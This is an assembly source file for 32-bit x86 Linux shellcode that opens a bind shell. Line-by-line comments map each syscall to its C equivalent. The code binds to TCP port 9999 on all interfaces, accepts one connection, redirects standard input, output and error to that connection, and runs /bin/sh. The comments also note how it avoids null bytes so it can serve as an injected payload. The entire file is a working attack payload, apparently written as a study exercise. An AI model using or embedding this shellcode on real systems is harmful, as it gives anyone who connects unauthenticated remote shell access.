; bind_shell.asm
; Author: Alex

global _start

section .text ; stores the main program code

_start:

    ; C code - server_sockfd = socket(PF_INET, SOCK_STREAM, 0);

    push 0x66       ; push the 'socketcall' syscall number 102 (0x66 in HEX) onto the stack
    pop eax         ; pop the pushed 0x66 value from the stack into EAX, EAX is the register that needs to contain this value
    xor ebx, ebx    ; zero out EBX
    inc ebx         ; assign the 'SYS_SOCKET' - 'socket()' - '1' function to EBX, EBX needs to contain the type of the socket call
    xor edx, edx    ; zero out EDX

    ; the following three arguments of the 'socket()' call are pushed onto the stack in reverse order
    
    push edx        ; push the third SYS_SOCKET protocol argument value of '0' onto the stack
    push 0x1        ; push the second SYS_SOCKET argument value of 'SOCK_STREAM' - '1' onto the stack
    push 0x2        ; push the first SYS_SOCKET argument value of 'PF_INET' - '2' onto the stack
    mov ecx, esp    ; ECX needs to point to the above list of three SYS_SOCKET args pushed onto the stack
    int 0x80        ; issue the 'socketcall' syscall
    mov edi, eax    ; the syscall will return the socket file descriptor value into EAX, so move that value into EDI to be used for later


    ; C code  - serveraddr.sin_family = AF_INET;
    ;         - serveraddr.sin_port = htons(9999);
    ;         - serveraddr.sin_addr.s_addr = htonl(INADDR_ANY);
    ;         - bind(server_sockfd, (struct sockaddr*) &serveraddr, sizeof(serveraddr));
   
    push 0x66           ; push the 'socketcall' syscall number 102 (0x66 in HEX) onto the stack
    pop eax             ; pop the pushed 0x66 value from the stack into EAX, EAX is the register that needs to contain this value
    inc ebx             ; assign the 'SYS_BIND' - 'bind()' - '2' function to EBX, EBX needs to contain the type of the socket call

    ; the following three values of the 'serveraddr' struct are pushed onto the stack in reverse order
    
    push edx            ; push the third value of the 'serveraddr' struct, which is 'htonl(INADDR_ANY)/sin_addr' - '0', onto the stack
    push WORD 0x0f27    ; push the second value of the 'serveraddr' struct, which is 'htons(9999)/sin_port' - '3879', onto the stack (added 'WORD' to get rid of 00 bytes)
    push bx             ; push the first value of the 'serveraddr' struct, which is 'AF_INET/sin_family' - '2', onto the stack
    mov ecx, esp        ; ECX needs to point to the above list of three 'serveraddr' struct values pushed onto the stack
    
    ; the following three arguments of the 'bind()' call are pushed onto the stack in reverse order
    
    push 0x10           ; push the third SYS_BIND protocol argument value of 'sizeof(serveraddr)' - '16' (in decimal) onto the stack
    push ecx            ; push the second SYS_BIND protocol argument value of '(struct sockaddr*) &serveraddr' - the pointer to the three 'serveraddr' struct values onto the stack
    push edi            ; push the first SYS_BIND protocol argument value of 'server_sockfd' - '3' (already stored in EDI) onto the stack
    mov ecx, esp        ; ECX needs to point to the above list of three SYS_BIND args pushed onto the stack
    int 0x80            ; issue the 'socketcall' syscall


    ; C code - listen(server_sockfd, 2); 

    push 0x66       ; push the 'socketcall' syscall number 102 (0x66 in HEX) onto the stack
    pop eax         ; pop the pushed 0x66 value from the stack into EAX, EAX is the register that needs to contain this value
    inc ebx         
    inc ebx         ; assign the 'SYS_LISTEN' - 'listen()' - '4' function to EBX, EBX needs to contain the type of the socket call

    ; the following two arguments of the 'listen()' call are pushed onto the stack in reverse order
    
    push 0x02       ; push the second SYS_LISTEN protocol argument value of 'backlog' - '2' onto the stack
    push edi        ; push the first SYS_LISTEN protocol argument value of 'server_sockfd' - '3' (already stored in EDI) onto the stack
    mov ecx, esp    ; ECX needs to point to the above list of two SYS_LISTEN args pushed onto the stack
    int 0x80        ; issue the 'socketcall' syscall


    ; C code - client_sockfd = accept(server_sockfd, NULL, NULL);

    push 0x66       ; push the 'socketcall' syscall number 102 (0x66 in HEX) onto the stack
    pop eax         ; pop the pushed 0x66 value from the stack into EAX, EAX is the register that needs to contain this value 
    inc ebx         ; assign the 'SYS_ACCEPT' - 'accept()' - '5' function to EBX, EBX needs to contain the type of the socket call

    ; the following three arguments of the 'accept()' call are pushed onto the stack in reverse order
    
    push edx        ; push the third SYS_ACCEPT protocol argument value of 'addrlen' - '00' (NULL) onto the stack
    push edx        ; push the second SYS_ACCEPT protocol argument value of 'addr' - '00' (NULL) onto the stack
    push edi        ; push the first SYS_ACCEPT protocol argument value of 'server_sockfd' - '3' (already stored in EDI) onto the stack
    mov ecx, esp    ; ECX needs to point to the above list of three SYS_ACCEPT args pushed onto the stack
    int 0x80        ; issue the 'socketcall' syscall


    ; C code - dup2(client_sockfd, 0);
    ;        - dup2(client_sockfd, 1);
    ;        - dup2(client_sockfd, 2);

    mov ebx, eax    ; move the connected client socket file descriptor value from EAX to EBX; EBX needs to contain this value
    xor ecx, ecx    ; zero out ECX to set the initial STDIN value of 0

dup2_loop:
    push 0x3F       ; push the 'dup2' syscall number 63 (0x3F in HEX) onto the stack
    pop eax         ; pop the pushed 0x3F value from the stack into EAX, EAX is the register that needs to contain this value   
    int 0x80        ; issue the 'dup2' syscall
    inc ecx         ; increment the value of ECX by 1 to set it to STDOUT - 1 (second loop), and then to STDERR - 2 (third loop)
    cmp cl, 2       ; compare the value of ECX with 2
    jle dup2_loop   ; If the value of ECX is less than or equal to 2, jump to dup2_loop


    ; C code - execve("/bin/sh", NULL, NULL);
    
    mov al, 0x0B     ; move the 'execve' syscall number 11 (0x0B in HEX) into AL
    push edx         ; push 00000000 (dword) onto the stack
    push 0x68732f2f  ; push "//sh" onto the stack
    push 0x6e69622f  ; push "/bin" onto the stack
    mov ebx, esp     ; ESP is now pointing to a memory address containing the begining of our string + 00, so move its value into EBX
    push edx         ; push 00000000 (dword) onto the stack   
    mov edx, esp     ; ESP is now pointing to a memory address containing 00000000, so move its value into EDX
    push ebx         ; push the memory address of the /bin//sh string + 00 onto the stack
    mov ecx, esp     ; move this memory address from ESP into ECX
    int 0x80         ; issue the 'execve' syscall